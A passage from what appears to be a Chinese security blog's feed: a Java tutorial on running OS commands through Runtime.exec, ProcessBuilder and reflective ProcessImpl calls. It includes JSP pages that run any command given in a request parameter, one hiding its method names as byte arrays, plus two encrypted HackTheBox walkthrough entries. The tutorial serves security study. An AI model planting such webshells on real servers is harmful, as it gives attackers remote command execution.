class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: ca01h</span><br><span class="line">  Date: <span class="number">2021</span>/<span class="number">3</span>/<span class="number">8</span></span><br><span class="line">  Time: <span class="number">18</span>:<span class="number">19</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String str = request.getParameter(<span class="string">&quot;str&quot;</span>);</span><br><span class="line">    <span class="comment">// 定义&quot;java.lang.Runtime&quot;字符串变量</span></span><br><span class="line">    String rt = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;);</span><br><span class="line">    <span class="comment">// 反射java.lang.Runtime类获取Class对象</span></span><br><span class="line">    Class&lt;?&gt; c = Class.forName(rt);</span><br><span class="line">    <span class="comment">// 反射获取Runtime类的getRuntime方法</span></span><br><span class="line">    Method m1 = c.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;));</span><br><span class="line">    <span class="comment">// 反射获取Runtime类的exec方法</span></span><br><span class="line">    Method m2 = c.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;), String.class);</span><br><span class="line">    <span class="comment">// 反射调用Runtime.getRuntime().exec(xxx)方法</span></span><br><span class="line">    Object obj1 = m2.invoke(m1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;), <span class="keyword">new</span> Object[]&#123;str&#125;);</span><br><span class="line">    <span class="comment">// 反射获取Process类的getInputStream方法</span></span><br><span class="line">    Method m = obj1.getClass().getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>&#125;));</span><br><span class="line">    m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串</span></span><br><span class="line">    Scanner s = <span class="keyword">new</span> Scanner((InputStream) m.invoke(obj1, <span class="keyword">new</span> Object[]&#123;&#125;)).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">    String result = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">// 输出命令执行结果</span></span><br><span class="line">    out.println(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>Runtime命令执行调用链</strong></p><p><code>Runtime.exec(xxx)</code>调用链如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">copyjava.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:<span class="number">247</span>)</span><br><span class="line">java.lang.ProcessImpl.start(ProcessImpl.java:<span class="number">134</span>)</span><br><span class="line">java.lang.ProcessBuilder.start(ProcessBuilder.java:<span class="number">1029</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">620</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">450</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">347</span>)</span><br><span class="line">org.apache.jsp.runtime_002dexec2_jsp._jspService(runtime_002dexec2_jsp.java:<span class="number">118</span>)</span><br></pre></td></tr></table></figure><p>通过观察整个调用链我们可以清楚的看到<code>exec</code>方法并不是命令执行的最终点，执行逻辑大致是：</p><ol><li><code>Runtime.exec(xxx)</code></li><li><code>java.lang.ProcessBuilder.start()</code></li><li><code>new java.lang.UNIXProcess(xxx)</code></li><li><code>UNIXProcess</code>构造方法中调用了<code>forkAndExec(xxx)</code> native方法。</li><li><code>forkAndExec</code>调用操作系统级别<code>fork</code>-&gt;<code>exec</code>(*nix)/<code>CreateProcess</code>(Windows)执行命令并返回<code>fork</code>/<code>CreateProcess</code>的<code>PID</code>。</li></ol><h2 id="0x02-ProcessBuilder命令执行">0x02 ProcessBuilder命令执行</h2><p>process_builder.jsp命令执行测试</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: ca01h</span><br><span class="line">  Date: <span class="number">2021</span>/<span class="number">3</span>/<span class="number">8</span></span><br><span class="line">  Time: <span class="number">18</span>:<span class="number">38</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    InputStream in = <span class="keyword">new</span> ProcessBuilder(request.getParameterValues(<span class="string">&quot;cmd&quot;</span>)).start().getInputStream();</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>)&#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    out.write(<span class="string">&quot;&lt;pre&gt;&quot;</span> + <span class="keyword">new</span> String(baos.toByteArray()) + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><ul><li>start方法执行命令,启动一个进程,返回一个Process对象；</li><li>java.lang.Process.getInputStream() 方法获取子进程的输入流。</li></ul><p>Runtime和ProcessBuilder的区别：</p><p>同个字符串参数对于ProcessBuilder类和Runtime类的命令执行结果来说是不同的，举个例子，比如同样是执行命令<code>ping -c 1 www.baidu.com</code></p><p>传入Runtime类的exec方法后，之后会先把<code>ping -c 1 www.baidu.com</code>以空格隔开分为四部分，第一部分的<code>ping</code>会作为启动模块，其他部分作为第一部分的命令行参数，如下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210309130457.png" alt=""></p><p>到了ProcessBuilder类这里，同样的命令传进来的话就抛出错误：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210309130738.png" alt=""></p><p>这是因为ProcessBuilder类把整个“ipconfig /all”都标记化了，在后面的调用中会把这整一串都当做启动模块的名字寻找。具体原因可以看下面两篇文章的调试过程：</p><p><a href="https://www.anquanke.com/post/id/221159">https://www.anquanke.com/post/id/221159</a></p><p><a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Java下奇怪的命令执行</a></p><h2 id="0x03-UNIXProcess-ProcessImpl反射执行命令">0x03 UNIXProcess/ProcessImpl反射执行命令</h2><p>Runtime命令执行中的调用链提到过<code>UNIXProcess</code>，<code>UNIXProcess</code>和<code>ProcessImpl</code>其实就是最终调用<code>native</code>执行系统命令的类，这个类提供了一个叫<code>forkAndExec</code>的native方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令。</p><p>ProcessImpl类需要值得注意的就是它没有共有构造方法，只有一个private类型的方法，所以是不能直接实例化ProcessImpl类的，虽然我们不能直接new一个ProcessImpl，但是可以利用反射去调用非public类的方法，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmd_exec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">processImplDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] cmds =  &#123;<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>&#125;;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        Method method = clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InputStream ins = ((Process)method.invoke(<span class="keyword">null</span>,cmds,<span class="keyword">null</span>,<span class="string">&quot;.&quot;</span>,<span class="keyword">null</span>,<span class="keyword">true</span>)).getInputStream();</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> size;</span><br><span class="line">        <span class="keyword">while</span>((size = ins.read(bytes)) &gt; <span class="number">0</span>)</span><br><span class="line">            bos.write(bytes,<span class="number">0</span>,size);</span><br><span class="line">        System.out.println(bos.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java基础学习之本地命令执行&quot;&gt;Java基础学习之本地命令执行&lt;/h1&gt;
&lt;p&gt;首先总的的来说，java命令执行可以分为4种方法，分别是 java.lang.Runtime#exec()、java.lang.ProcessBuilder#start()、java
      
    
    </summary>
    
    
      <category term="编程" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="java" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"/>
    
    
      <category term="java" scheme="http://ca0y1h.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Passage-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/24.HackTheBox-Passage-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/24.HackTheBox-Passage-Walkthrough/</id>
    <published>2021-01-31T04:06:32.000Z</published>
    <updated>2021-01-31T04:08:29.751Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6846db320cd128fad25d9ca1fc4c5d5ff88472c9760663f893219206ae954ae8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Delivery-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/23.HackTheBox-Delivery-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/23.HackTheBox-Delivery-Walkthrough/</id>
    <published>2021-01-25T13:40:50.000Z</published>
    <updated>2021-01-31T04:08:21.214Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c7a4e24ecb3297b4f4dff3f2cb1d8367222253fc649d328db0af4fc40f517521">9b1741d19bc98bca523cf47d84dfbbb085c3cf46a927ce65af6caef4061203a115589609b2a1db2b701bc4c49954dd115cabf1d068c6045e50a1f10e2e7096d3de8f352a490b042233b5f967370327fc219101fad8dc8160553b51659430797267419bedcca6891aee1fa4631da3204671a19d1bd99eca383d73c0d7da1a6a0d66b4d0c4a6ca4a60bd69298c2b66c23a65505a9ae0b0c97efe989e3adf85f93ee89d9e066aa1499f6a0747db820fe03098c9cd6bbf098ba3d14f373e054a1d423951afb73d48a0523a86c6125e7936c628916027a4bc39a5ea80922fb36541922e4516dbd0c3f733228bb9e4b0d84defff31296652402b9175ab0ca95df7d99073a535df9a8b5ee05e2c5e37b0cc01541c3da5dbd7ef64b5b773a08a948a8fa290167106662eb1e3e7dc310308c041dc74666e96c8ca236ba93ebfd220503db3ddb7f48f4f78ef2e51bbae259a6eaede50bba8d8718a9a7a7662df4d701a8b5920251170615755ae0772dfafd303ad64fab9f1a003b000fa2d5f0557840c1cc7e1f3791559a5410df307f3d48d5cef75b877f6b43a7b9940e1a4e2cd8c1873ddcbaa29130712d91832077276233de5b27cfb7450583513e2b8a3a7e6c4a8474e797bed9b2ebd82dc3ecef25b5ef9f0d58f0839cbc67bdc6c446c76902e46e3c353241ee3ab1ec4a1bdadf909b2f77182ce7e89ee1343c79e1d4a485e6278c047c53a53c81d227c560e078499b063983c276d9e98c810a8caa68e442beef1cd1208fa1315e56ca2fde889f31da5570fa41410a87ca5b531fb593a6750f7177ecb042ca2216bcb0e85c595c64b36c8d1a30e26db0d3f0391ef084de7b638fa8768f3b0ff9c3a1081a08fea53bd7e6737f4b478af79056de205254b1eaa1bb4586d741f2c7c4dda02f3eb9254eb702a37a6f1c3355c3e0aedf91b47e6122016f17a00c4d314225d213b1e6c11d2f2222663d0e732b89781b1b2b1edd0579e3626d60368da13ad72ab4d50e1808947f7b40331533ff64ca1753d92f529800ab51cfe8fa7d1d9963c249ce12cfac14d883839110800bf2f889d92fa11b81a8e17bf1cd0a31bd5a70a972bfc1b8685430be5db048d164175f1a97be61126d5c09cc1a75f249c6405a8220975bf073c3b04cae2e074e19b93238c3738f664079e0d692ba86d2de4461fb42f8abf022af908207dee4157e04ea343831d28e50e5e6ccabe4900d409f6a300ce806a7be61efa88be360a55e717fdfd2577363c6b9e4a94d730e0b41a12de6979725acd33f7ab68357b728f9cccb6c62be0c7cdc7d87ddbb684d86b50d4de40e9e6337316efc626e870bd0f7a5dd791f858b574a4be72464efe42866c729855bd91bf95630717dec9736da6bab4d47dfcdee76bf0871f2a77a5f2a0fba4ebf809403d0433f2a04785622a56ff9b90c612f616080333b0763f4f724be7d7ec3f8dd2898934be027dbfa689cf37b50a89e73023d2a2f3fd3f337299be7b06557c9fc946ad28a669eb911323f03c65d6588920043cc59a1c9411a421a0f715f0bb773b95b3de537407d9d5dd94a5072380c910ba8c583f180de8a5d1d587caf87ab605622ff24d8df52aa8555d0e8f39a6580fdff94fbc70a5ccabebd50c0e21e2db8c95a12d332cc364fba878084ad9b23e9c0b8d263eafbbb856dc415b5018aff1aacbc7396d578e2048f1be7b70155a4449830257e53cc64645c1c009ba1db72ad146dc459ee9d9c430fba960ecdf7c1510e150b10b1f6aad7b24c392f3c2fce9d49c1051d29ea3105d7492b2e9868f360d74240363d26e2e0f4803296c5592b983425b57aa98f1ebc7aaa9b385ee2e92b8409b239611c83646833b80fe29b65baa0bb4ab8b3fb00001bb67070f5f9f2a0b40082af706c7bf653113bf934c9ff1011304652d11ada6d8cfede47025756ba21e4b51fa310a0cf8afcb0a91fdf6404dc5cf2159ce899089517e63366c571afe51cdd51da29ea032e211841defac5dfbbc1352c66f7593c8f025806dc22bc79c02ddba08da6a9de0296bc498a9adada54c36c8aa438a4268d9dc070c02be5a267be886bf8f8371076c74b8247062a3aa61d91f57fd7e6c1e5d4c26743c98e53d5eded3a4fa90f964e35b5a106d7e4bb868396177b1960cd0e4c0b9927e88f847167fb6f2ddc70e95c090e89b064db91a8106c3349b4c0bccf9bbc1c21ec34cd140e9194ca919099b896bb61a2c4776e48eb54143f3fadb9d78df1faabc086d5bf14d4065580777ff4dc3da6ada44380e1f73c8c9dcf7acb16442c0b758cba1caf0e4b64b14a08dbc88389cd2b0d99683b9b1f841f5858d39b16a5fcd0288e2d9b6cab93e69fd0a369da9e87b851cd00780d0e3decf1b5b9204c3d6c8492bc1cde4e86bde09dfb4152ad14ba72b1975e6c923a43edaa9afef71ba1417fa3e86347b36cfbcd1b2e43768d24352b367fa23636ed5d4fa4e21a5de7704fb5a2c46ce3860b1f4f6f57b7b4bbdcc620a6c948ae89d4134083e122f3f5f6e91e527359b14b6094a0b17140d894abd0bd41c5aa157a7a763bde97c44e0d14c0767cba2ed0604f2aa38385916dacfac3386565f738f5cbde07af068c23f0b5323496235c19f038e0fb940aac04b965fdcda3e67d3c3ce86a371796a40c60aad20c37d5330667403b89dcb6ea23baab1005f65c49f999aac476559fb9ab070b6aadf856ce295bba326c5980918347043470c8e5466c03ba10ad658edc0a70fc45677e870fbc10e59443bd84e4cbd93682646c664e204b174db484af981207b7fb3fe0a9d2d99814bbf722be873b2533faec02bb626f21fb589dfc072b89745d787c6e0430569684fb41461596a4262ca20d80b65b420bd46185e0f51d674258bac353ca8fb4d9849aa6f741bf86475f55493b22646368265ca027edf77a74b96aa95066c3060e38b24d69d0fd274bafbf4351ecd38a0b8072b7c279bb223b2268c2067dcc48bddc72c31f5ea51cf887963b859272cc51df6363baa21f530362cdebb9c19c2db91d42f2c7f4c823f5df5bdb44f2457c803ed432896b90d64c40efa71b9fa36d366bef0a6651fea8473d53628aecc9433e905ed296ab7e39fead3519c9e87b9ae0ad4b31059cdaeb42c7f3a5145674f4bd06c2cd563134a06e0ec6535767523fc8a423b086d38f2087ed3a4b868f915990e5cd965b6c2afd6a2bb2b27058568e83bf9b0e6b32bee3bed5ebcf115ad73c6f99334aa104bffe0100b767004e72717611912aceb2bb05e634f114b7951e8b93402c0e1182469297586743b8c57419d821c97f441954074845ef80ee6ae57546296c5ed13ec3e3e1e76a109b10d07c3f3935691af498df2c855f3dfffbe0912cedf838d35b66908d7e0bcfcf34e8a8eb742b06cf757391d739c6f9ac7e093b4f4f99f132e887b4a9010d4b4c2cba6c3c9f2908ea6d4b1cb30fdbc734459657f0da5b0a83a6e6b3b7fadbdf49dd8b6c038b865bde7cea55e1d5b24e816528aa2aba438eed7d4cbba00164e1ebd741f3247399699100f64d714950923abf0644dfd9ab73b5a33631bf758c04479c2db0cdf2c8c986e0c4c05026d1ef8364d9ef9173fae020d4c883e74083c6937983291560bec25f8dd3bccb050570ea4bb5071462a5a15fde3a47a9b888f02c05d715baf799bb98844bbf888b2af7023d2a5692f5dfaa71782cfe1d11e93c4c8fd3e95f2896205a71b2441db1ed7ecf11dedd2a665c9ea85cba317135814fb05028ee67021651e74e788e8a983167f5db57eedb43234471024c0442c6197da24cf635e4e757a30b43369df02299d99a7eb698886f5a96fde0183d3de2eb54befe0304a5109a55aa7df594f5363ca872c72c7c3b7400950d81be0f8d481fefc8b24712216b79c6594eec5fd28015622b549eb3fb82dddf00fe2981156ecd3103d54cfdaf7aa46f77cc7a6c1ca320755c2e1e9f85a0df0de3980ca5661fbe523210a9a382e43042d2be46be9e364f1c0797ab024db9100f33d4d5171d2f08afab6c5d064b27a3bd5ad015a6c40e07ace3ab241ec5b6f79306c9183436e2c28f4e93bb18cfd70b523617c23ffbf9aff91c7bc2e389ec7b664d3fc7514e9359b07a9ac9ae7afdb7cbd516b6598a093fb5e772460b261060c066f586c0ff10e7997148b838928c9160664d8d0e55ac126aed6cd257bd760e26932ed21864c4925bce69cfa1da2642f1fa563dc82de07db9292f469d47c9877d8b5f737357cad0b04ac1bba70e77881c3c5a0edc14716de14aa62458d302b1388ff731ab0f2e7cff170c057f183da8562fe4221edd6c41b37447902bd2a15e69bc5912e0620fec5ce891d729f7ab84efd69b8fd711a407aa44c1594af5779fc6b5dd3df3e331ec7d460a4e5a0726a701135de92f68cbca2a242969349c25156d8a9a5715990b672731e628f56c2d27b5101f155ae31cd5323c17cb73fc08bd931fd1b010ce88eb88351efa0c05d49bec8b17f1120f324343f3f70d8aa63aa711f9274eb4ff79de03ded7f8e7ab805d63f2166d55aa1cfef42c839222169b486f38b2cae4c31109f519cdb3117bf0795e4ffe7fbe9baa1be40abf5c74ca0dd35f323ab214532fdfc560a447144c7ddc24f62b047f9340d2225481f14c39ad1167858137f76ca37e7bcda0a8f123d2db121b175ed2be573b90e31ffa2d414166a990871f403e3c3f0498b2ce1df802b684c7e2a8e3a3b87226a02f79c79f5dd587c69b82080ed4e016829888b42cb29c7916cb5beaabf1dc0ef6216824d34c1fe1e1d0da2419f0807a616c04ad29f11406255da71cf97c1a8d1a3d935266a6b4e64de1a1bbd1fbbe8f44de16b6a9686c167b169f46cecaa6549144013c8e73e5d1e0a5b2846b6596f7fd801d7bf3084afd8c4e000fe04d1a3ea0f4c9b10dfd1da19135116f5afb26b82ec11a952ef49867e38cfee434fe04a62a38a2cdb1e3933fbf2499b101d82c4af1d2628bd0d2678845d003f4e080c2858f31f9b175b57e4ab1b19517f8fa9a474a8b6ed5c91139b375b57de4256ae993914862ad6ad1c2c9f2d3935194e7cf5e3376322bcd648da396b0c7c06ab33bca4d2ba54a128f90edf2d2695f44f4817e3c2011b7ae1911c673e7f7af2cd500ac2c611cce850ed041f4e82cd78669404eda0db376678843c5c3d937a3c46231a1e4d6e34ae30ba9707adc8c448ad7dbab4d8a9c45e603e6bf83e9596a6bb38c002aa3f5300163678e0d87c32c257f7c718670a1391048080d56201abbb15d8ff8ffe861ce5258e89743e28505e2b646a2b21e417985426a7a77c16d6be249fa0e9620fed571eb35e153113e73cf15851e6fc7772d5dcbd2096dc9533cc54dfd47c475a623852e4d4cda32b12d15e9657c3dffe605d4fd343fa6770ddc355c5125dafe3e11b7936fb3757057b76d7044f5dc9c2852238b0f674be342b3e8184bb494e7267081457c078969dacce93e51107e8a5376442c26e3ad9536c3e3e1748f5ccb4afa89e19a529866929e9b9dd70f410950e1a9473a7effc73600bff86617955488b50a989d3ad82a8f9f793babd7b100ef034df5f41fc2436550903fb7e1fd11f7394afc562ac9888ce46d6f9a0ff306785e59db6524117033f6ebb93959b52aa83b8db62ffb7282fb7d576e2f306a2b726076d8cf6bb0726eee9fa3d466066285fea1d52cbd461ffff1df1e7f46084a79554fca1de59a63aee6f214910ccbba4f3a7f1ecc667be8847c65eb280bbfbf69e195c8e9fe02715e5aceea2546ba275684d20a5074ba9f7994ba23dd3ba839a819e68316e7dcd4968b5022c30b8694ffae72febcc0a1fd83b22897d35b16371f1d61175d0ca5048eb396c6a56d0739573f7e27298481d9f29f25a3b87c48a72140cb727736382094ce4073a05c72998f692abab32ec17c15fac3d3542dc56d3badd01e9206b40d2914ea7e56f565b88b63b0eca044492583712ca7e3e8ead4ec62d5a89bc133bd1691d9c11b036045d15b47c7dcd8eb4db36d73394627eed40e931fbe1245e8c1c71f73a3cc89585cc0e34275b65d83d966e0659640d320815adbd918017bdd973cc63fd977ba6a007460dc6757ea2d41f8b308563b9c0385e91962cb283bd8334a8e47ec400e7183d8367a231e589b75cea6e1d7be40efa79d05816dbbe7ce8a543bc75b085f5a93ac8dff82a8b5eaad00b79bad7ca93e240246ee5d34da14d84f0cecf9b74a7d093da7914376a6b585acd559c7bf152a132679b9a37b81cb5e5f9418a26db8a896c4c7b4b09a082657a4beae0f642a3b879b779f76747a3ac9fa7574a01d2826e83ae01a38b74abb86da4d3e99c4dbdd72c255350d964fae24af574b40a0c750bd5e1553aa069c357e874a6f6a04cf9763bb5c73a32a78e62ff07991ca30d55e81219dd7d1e3b7ac08d2e9ca300dffbddee5b9261e098b3bf7511fefb723fef55af69bbfea4660f88c5d2ff26fadb563305fab78c44fecc30625ab68ea774c730d80f8be41fbc8aac073b834f1ad6f694427fde256fe45bc687b3712b73199c70e61a63ed37fcb2cc11ca72d96aefb7f46556eee8d30434735e774b19957b00c314d119ea67cf47bdfb356b918e1c93bff28039116358abf627f886d21bf466e64849d337e428e047cb4ffc6088224d39a8fbca3bb81b794ee7ea3b91d119b4cbab588da023f971d2bd3ccd2b85ddba79087dedcd8626b67231343f251ee6ef2baf742e964c99de882ea8316591a5ba23d937dff8771ab1de7e5ca41743e5a3f9403100d4cabed3b4835ad6fc83b980de8f9fbcc36aa70fbb75b3828e295c1d850b001abd97b5448afcb31d90e4199aafb4e84bdb142db7a8ea54f0291cde293f7692c92bd7f29d9f8025bb832e8643574cd2ded9c4869a6ffb8a1f6c2af2d26b0db34a38e7f4ebb6d6f02e2dd5257020190940c82f14fcbd16105bf9a6ce5dd34d7f3b1e857c023524cbfdbadc0829af57d2c592a183c3cb20582a4714ee4dac03c66e20b6ced737902d602d7c7320c063ab678aa3c2961e76c03974e9703034aea882008771e8b459bc25c9e36afafd9438a023f7e2568e730b13c8c97d129a09c23fd95dfb82f5a4775301b6c10c574fb8c09eafa498f5c405b1ff8604f3812dbb0962b576ae722dec15347c5a4b4343aa312332d6ea858186cf08ef2278b42dd1a1ea72026b3063dd7bfb82252e705158c5b50fcca8c31a5efa95e325bea360647b6b9c368fa44d6fa2dc36fb3270e71fa79e86f05678c14c86dff8d1e36329bea38122676fea13bb8c95700195b17c5